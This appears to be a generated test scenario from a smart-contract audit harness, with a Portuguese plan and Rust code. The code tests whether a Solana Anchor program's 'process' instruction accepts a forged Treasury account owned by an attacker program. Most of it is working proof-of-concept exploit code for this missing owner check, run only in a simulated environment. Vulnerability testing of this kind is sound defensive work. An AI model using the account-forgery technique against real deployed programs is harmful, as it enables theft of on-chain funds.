  "plan": "O baseline inicializa uma conta Treasury legítima pertencente ao programa-alvo, com authority, balance e is_active=true, provando que o cenário está montado corretamente. O ataque repete a instrução `process`, mas substitui a conta treasury por uma conta forjada cujo dono é o programa do atacante e cujos dados imitam o layout de Treasury com is_active=true. Se o programa aceitar a conta forjada, o ataque terá sucesso; o efeito medido é que a conta forjada, com dono diferente do programa-alvo, foi usada e permaneceu com os dados forjados após a execução.",
  "scenario": "let authority = Pubkey::new_unique();
let treasury_key = Pubkey::new_unique();

let treasury_data = anchor_account_data("Treasury", &(authority, 1000u64, true));
let treasury_account = account(&env.program_id, &treasury_data, None);

let baseline_ix = env.anchor_ix("process", &(), vec![
    AccountMeta::new_readonly(treasury_key, false),
    AccountMeta::new_readonly(authority, true),
]);
let baseline_accounts = vec![
    (treasury_key, treasury_account.clone()),
    (authority, wallet(1_000_000_000)),
];
let baseline_result = env.baseline("process com treasury legitima", &baseline_ix, &baseline_accounts);

let attacker_program = env.attacker_program.unwrap_or_else(Pubkey::new_unique);
let forged_treasury_key = Pubkey::new_unique();
let forged_treasury_data = anchor_account_data("Treasury", &(authority, 999_999u64, true));
let forged_treasury_account = account(&attacker_program, &forged_treasury_data, None);

let attack_ix = env.anchor_ix("process", &(), vec![
    AccountMeta::new_readonly(forged_treasury_key, false),
    AccountMeta::new_readonly(authority, true),
]);
let attack_accounts = vec![
    (forged_treasury_key, forged_treasury_account),
    (authority, wallet(1_000_000_000)),
];
let attack_result = env.attack("process com treasury forjada de outro dono", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    let forged_after = after(&attack_result, &forged_treasury_key);
    env.effect(
        "conta forjada com dono diferente foi aceita e usada",
        forged_after.owner() == &attacker_program
            && read_u64(forged_after.data(), 40) == 999_999u64
            && forged_after.data()[48] != 0,
    );
}"
